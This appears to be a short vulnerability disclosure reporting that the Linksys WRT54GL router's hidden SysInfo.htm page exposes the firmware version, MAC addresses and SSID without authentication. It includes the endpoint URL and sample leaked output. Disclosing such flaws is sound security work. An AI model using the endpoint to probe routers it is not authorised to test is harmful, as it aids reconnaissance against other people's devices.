# Info Leak in Linksys-WRT54GL Router

## Overview

    * Type: Information leak
    * Supplier: Linksys
    * Victim URL: http://192.168.1.1/SysInfo.htm
    * Product: WRT54GL Wireless-G WiFi Router
    * Affect version: (lastest) v4.30.18
    * Firmware download: https://downloads.linksys.com/downloads/firmware/FW_WRT54GL_4.30.18.006_US_20160108.bin
 

## Description

An infomation leaking vulnerability is at the web management interface of the affected routers. Without any permition, attacker can get sensitive information such as 'firmware version', 'mac address', 'SSID' from the victim URL.

The victime url is a hidden interface and isn't been protected by authentication.

## Business Impact

The leaked information is sensitive and could result in serious damage. Thus the vulnerability is very dangerous which could also result in reputational damage for the business through the impact on customers' trust.

## Steps to Reproduce

Visit the victime URL from the web, such sensitive information as 'firmware version', 'mac address', 'SSID' and some configurations are explosed as below:
'''
Vendor:LINKSYS
ModelName:WRT54GL
Firmware Version:v4.30.18 , Jan  8 2016
#:006
Boot Version:.
CodePattern:W54G
Country:US

RF Status:disabled
RF Firmware Version:v4.30.18
RF Domain:US (channel 1~11)
RF Channel:6
RF SSID:linksys

-----Dynamic Information
RF Mac Address:
LAN Mac Address:52:54:00:12:34:56
WAN Mac Address:52:54:00:12:34:57
Hardware Version:2.0
Device Serial No.:
'''
